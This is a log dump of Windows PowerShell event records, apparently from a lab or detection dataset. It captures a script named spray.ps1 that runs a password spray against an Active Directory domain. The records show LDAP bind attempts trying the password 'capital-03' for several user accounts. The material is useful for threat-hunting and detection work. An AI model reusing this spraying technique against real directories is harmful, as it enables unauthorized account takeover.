<14>Jul  8 13:49:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288182,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4790,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         Start-Sleep -Seconds $Seconds\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=614\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        Start-Sleep -Seconds $Seconds\r\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"60\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288183,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:43 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288182,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4789,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Start-Sleep\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=613\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Start-Sleep\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Start-Sleep -Seconds $Seconds\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288183,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4792,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Invoke-SpraySinglePassword\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=617\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Invoke-SpraySinglePassword\r\n\tCommandType=Function\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=            Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -Password $Passwords[$i] -OutFile $OutFile -Delay $Delay -Jitter $Jitter -Quiet $Quiet\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4832,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=670\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4794,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Get-Date\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=619\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Get-Date\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=    $time = Get-Date\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4801,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:     $RandNo = New-Object System.Random\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=628\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=    $RandNo = New-Object System.Random\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.Random\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4834,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=672\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, steve.oneil, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4831,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=668\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, jane.rodgers, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4808,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=638\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4837,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=676\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, tyler.taylor, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4827,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=663\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4805,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=634\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4818,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=651\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4825,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=660\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, joyce.fielder, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4844,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Write-Host\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=685\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=Write-Host\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        Write-Host \"$Message Waiting for $($Seconds/60) minutes. $($Seconds - $Count)\"\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4804,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=632\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, john.smith, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4795,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:     $time = Get-Date\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=620\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=    $time = Get-Date\r\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Date): \"Get-Date\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4823,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=658\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4836,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"New-Object\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=675\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tCommandName=New-Object\r\n\tCommandType=Cmdlet\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandPath=\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:49:44 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657288183,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":800,"SourceName":"PowerShell","Version":0,"Task":8,"OpcodeValue":0,"RecordNumber":4807,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Pipeline execution details for command line:         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=636\r\n\r\n\tUserId=STACKEDPADS\\tim.smith\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=32\r\n\tScriptName=G:\\spray.ps1\r\n\tCommandLine=        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)\r\n \r\n\r\nDetails: \r\nCommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"System.DirectoryServices.DirectoryEntry\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"LDAP://DC=stackedpads,DC=local, jim.johnson, capital-03\"\r\n","Category":"Pipeline Execution Details","Opcode":"Info","EventReceivedTime":1657288184,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
